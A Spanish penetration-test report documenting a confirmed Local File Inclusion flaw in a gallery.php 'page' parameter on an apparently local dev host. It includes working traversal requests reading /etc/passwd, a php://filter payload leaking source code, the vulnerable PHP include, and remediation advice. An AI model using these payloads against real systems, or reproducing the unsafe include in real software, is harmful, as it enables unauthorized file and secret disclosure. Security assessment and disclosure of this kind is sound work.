# Informe de análisis LFI

- Objetivo: `http://web.dev.local:8081`
- Fecha del análisis: `2026-04-21T10:54:28Z`
- Tipo de vulnerabilidad evaluada: Local File Inclusion (LFI)
- Resultado: **Vulnerable**
- Explotación: **Confirmada**

## Resumen ejecutivo

La aplicación expone un parámetro `page` en `gallery.php` que permite incluir archivos locales sin validación efectiva. Se confirmó la lectura arbitraria de archivos del sistema, incluyendo `/etc/passwd` y `/etc/hosts`. Además, mediante el wrapper `php://filter` fue posible extraer el código fuente del archivo `gallery.php`, lo que confirma el origen del fallo y amplía el impacto.

## Superficie analizada

Durante el reconocimiento inicial se identificaron enlaces como:

- `http://web.dev.local:8081/gallery.php?page=modern`
- `http://web.dev.local:8081/gallery.php?page=classic`
- `http://web.dev.local:8081/gallery.php?page=abstract`
- `http://web.dev.local:8081/gallery.php?page=about`

El parámetro `page` fue seleccionado como vector candidato para LFI.

## Evidencias de explotación

### 1. Lectura arbitraria de archivos locales

Solicitud utilizada:

```text
GET /gallery.php?page=../../../../etc/passwd HTTP/1.1
Host: web.dev.local:8081
```

Evidencia observada en la respuesta:

```text
root:x:0:0:root:/root:/bin/bash
```

Solicitud adicional:

```text
GET /gallery.php?page=../../../../etc/hosts HTTP/1.1
Host: web.dev.local:8081
```

Evidencia observada en la respuesta:

```text
127.0.0.1 localhost
::1 localhost ip6-localhost ip6-loopback
```

### 2. Divulgación de código fuente con `php://filter`

Solicitud utilizada:

```text
GET /gallery.php?page=php://filter/convert.base64-encode/resource=gallery.php HTTP/1.1
Host: web.dev.local:8081
```

La respuesta incluyó un bloque Base64 válido que, al decodificarse, mostró el código fuente del archivo `gallery.php`.

Fragmento relevante recuperado:

```php
<?php
$page = $_GET['page'] ?? 'modern';

if (strpos($page, '.') !== false) {
    $file = $page;
} else {
    $file = "pages/" . $page . ".php";
}

include($file);
@include($file);
?>
```

Esta evidencia demuestra que el valor controlado por el usuario termina resolviendo directamente el archivo a incluir, sin una lista blanca efectiva ni normalización segura de rutas. La capacidad de extraer `pages/modern.php` mediante `php://filter/convert.base64-encode/resource=pages/modern.php` confirma además que el parámetro se usa para resolver recursos locales del servidor.

## Impacto

Un atacante puede:

- Leer archivos sensibles del sistema operativo.
- Obtener código fuente PHP y facilitar ataques posteriores.
- Exponer secretos, configuraciones, credenciales o rutas internas si existen archivos accesibles.

La severidad es **alta** por tratarse de lectura arbitraria de archivos y divulgación de código fuente en el servidor.

## Conclusión

Se confirma una vulnerabilidad **Local File Inclusion** explotable en `http://web.dev.local:8081/gallery.php?page=...`.

## Recomendaciones

- Sustituir la resolución dinámica de archivos por una lista blanca estricta de vistas permitidas.
- Rechazar cualquier valor que contenga `/`, `..`, wrappers (`php://`, `data://`, etc.) o rutas absolutas.
- Mapear identificadores lógicos a archivos fijos del servidor en lugar de concatenar rutas controladas por el usuario.
- Deshabilitar la exposición de errores detallados en producción.
- Revisar permisos y presencia de secretos en archivos locales accesibles por el usuario de la aplicación.
